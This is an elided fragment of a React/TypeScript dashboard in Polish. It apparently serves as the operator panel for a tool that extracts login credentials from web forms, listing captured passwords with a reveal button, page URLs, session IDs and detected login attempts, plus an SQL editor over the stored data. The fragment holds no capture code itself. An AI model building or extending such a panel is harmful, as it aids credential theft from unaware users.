...
function getFileIcon(extension: string | null, mimeType: string | null): string {
  ...
  if (['js', 'ts', 'py', 'java', 'cpp', 'c', 'h', 'php', 'rb', 'go', 'rs'].includes(ext))
    return '💻';
    ...
    <DashboardContent>
      ...
      {toast && (
        <div className="fixed top-4 right-4 z-[100] animate-in slide-in-from-top-2 fade-in duration-200">
          <div
            className={`px-4 py-3 rounded-xl shadow-lg border backdrop-blur-sm flex items-center gap-2 ${
              toast.type === 'success'
      ...
      {previewFile && (
        ...
        >
          <div
            className="bg-slate-900 border border-slate-700 rounded-xl max-w-4xl w-full max-h-[90vh] flex flex-col shadow-2xl"
            ...
            <div className="p-4 border-t border-slate-700 bg-slate-800/50 grid grid-cols-2 md:grid-cols-4 gap-4 text-xs shrink-0">
              <div>
                ...
                <div className="text-slate-200">
                  {new Date(previewFile.timestamp).toLocaleString('pl-PL')}
                </div>
              </div>
              <div>
              ...
              <div>
                ...
                <div className="text-slate-200 font-mono">
                  {previewFile.session_id.substring(0, 12)}...
                </div>
              </div>
              <div>
      ...
      <div className="mb-8">
        <div className="mb-4">
          ...
          <p className="text-slate-400">
            Zarządzanie plikami i wyciągniętymi danymi logowania z formularzy.
          </p>
        </div>
      ...
      <div className="flex gap-2 mb-6 flex-wrap">
        ...
        >
          🔐 Dane Logowania
          {credentialsStats && (
            <span className="ml-2 text-xs opacity-75">({credentialsStats.total})</span>
          )}
        </button>
        <button
        ...
        >
          🗃️ Edytor SQL
          {tables.length > 0 && (
            <span className="ml-2 text-xs opacity-75">({tables.length} tabel)</span>
          )}
        </button>
      </div>
          ...
          {credentialsStats && (
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-4">
              ...
              >
                ...
                <div className="text-2xl font-bold text-slate-200">{credentialsStats.total}</div>
              ...
              {Object.entries(CREDENTIAL_TYPE_CONFIG).map(([type, config]) => (
                <div
                  key={type}
                  onClick={() =>
                    setCredentialTypeFilter(credentialTypeFilter === type ? 'all' : type)
                  }
                  className={`p-4 rounded-xl border cursor-pointer transition-all hover:scale-105 ${
              ...
              <div className="overflow-x-auto">
                ...
                <div className="p-3 bg-slate-800/50 border-b border-slate-700 flex items-center justify-between">
                  <span className="text-sm text-slate-400">
                    ...
                    {filteredCredentials.filter((c) => c.credentialType === 'password').length >
                      0 && (
                ...
                <table className="w-full text-left">
                  ...
                  <tbody className="divide-y divide-slate-800">
                    {filteredCredentials.map((cred) => {
                      const typeConfig = CREDENTIAL_TYPE_CONFIG[cred.credentialType] || {
                        icon: '❓',
                      ...
                      return (
                        <tr key={cred.id} className="hover:bg-slate-800/50 transition-colors">
                          <td className="p-4">
                            <div
                              className={`inline-flex items-center gap-2 px-3 py-1 rounded-full ${typeConfig.bgColor}`}
                            >
                              ...
                              {cred.credentialType === 'password' ? (
                                <>
                                  ...
                                  <button
                                    ...
                                    title={
                                      revealedPasswords.has(cred.id) ? 'Ukryj hasło' : 'Pokaż hasło'
                                    }
                                  >
                          ...
                          <td className="p-4">
                            <span
                              className={`text-xs px-2 py-1 rounded-full border ${confConfig.bgColor} ${confConfig.color}`}
                            >
                              {confConfig.label}
                            </span>
                          </td>
                          ...
                          <td
                            className="p-4 text-xs text-slate-400 max-w-[200px] truncate"
                            title={cred.pageUrl || ''}
                          >
                            {cred.pageUrl || '—'}
                          </td>
            ...
            {loginsLoading ? (
              ...
              <div className="text-center py-20 text-slate-500">
                ...
                <p className="text-sm mt-2 text-slate-600">
                  Próby logowania są wykrywane automatycznie z formularzy
                </p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                    ...
                    {filteredLogins.map((login) => (
                      <tr key={login.id} className="hover:bg-slate-800/50 transition-colors">
                        ...
                        <td className="p-4">
                          <div className="flex items-center gap-2 text-slate-400">
                            ...
                            <span className="font-mono text-sm">
                              {'•'.repeat(Math.min(login.passwordLength, 12))}
                            </span>
                            <span className="text-xs text-slate-500">
                              ({login.passwordLength} zn.)
                            </span>
                          </div>
                        </td>
                        ...
                        <td className="p-4">
                          ...
                          {login.redirectUrl && (
                            <div
                              className="text-xs text-emerald-400 max-w-[200px] truncate"
                              title={login.redirectUrl}
                            >
                              → {login.redirectUrl}
                            </div>
                          )}
                  ...
                  >
                    <div className="flex items-start gap-3">
                      <div className="text-4xl">
                        {getFileIcon(file.file_extension, file.file_type)}
                      </div>
              ...
              <div className="bg-slate-900/50 border border-slate-800 rounded-xl overflow-hidden">
                <div className="p-4 bg-slate-800/50 border-b border-slate-700">
                  ...
                  <p className="text-xs text-slate-400 mt-1">
                    Kliknij tabelę, by wygenerować zapytanie
                  </p>
                </div>

                {tablesLoading ? (
                  <div className="p-4 text-center text-slate-500 animate-pulse">Ładowanie...</div>
                ) : (
                  <div className="max-h-[500px] overflow-y-auto">
                    {tables.map((table) => (
                      <div key={table.name} className="border-b border-slate-800 last:border-b-0">
                        ...
                        >
                          <div className="flex items-center gap-2">
                            <span className="text-lg">{table.type === 'table' ? '📋' : '👁️'}</span>
                            ...
                            <div className="space-y-1">
                              {table.columns.map((col) => (
                                ...
                                >
                                  <div className="flex items-center gap-2">
                                    {col.pk ? (
                                      <span className="text-amber-400" title="Klucz główny">
                                        🔑
                                      </span>
                                    ) : (
                                      <span className="text-slate-600">•</span>
                    ...
                    {queryHistory.map((item) => (
                      ...
                      >
                        <div className="flex items-center gap-2 mb-1">
                          ...
                          {item.executionTime && (
                            <span className="text-xs text-slate-600">{item.executionTime}ms</span>
                          )}
                        </div>
                  ...
                  <h3 className="font-semibold text-white flex items-center gap-2">
                    ...
                    {sqlResult?.success && sqlResult.rowCount !== undefined && (
                      <span className="text-xs font-normal text-slate-400 bg-slate-700 px-2 py-0.5 rounded">
                        {sqlResult.rowCount}{' '}
                        {sqlResult.queryType === 'SELECT' ? 'wierszy' : 'zmienionych'}
                      </span>
                    )}
                    ...
                    sqlResult.data && sqlResult.data.length > 0 ? (
                      ...
                      <div className="p-10 text-center">
                        ...
                        <p className="text-slate-400 text-sm mt-2">
                          {sqlResult.changes}{' '}
                          {sqlResult.changes === 1 ? 'wiersz zmieniony' : 'wierszy zmienionych'}
                        </p>
                      </div>
                    ) : (
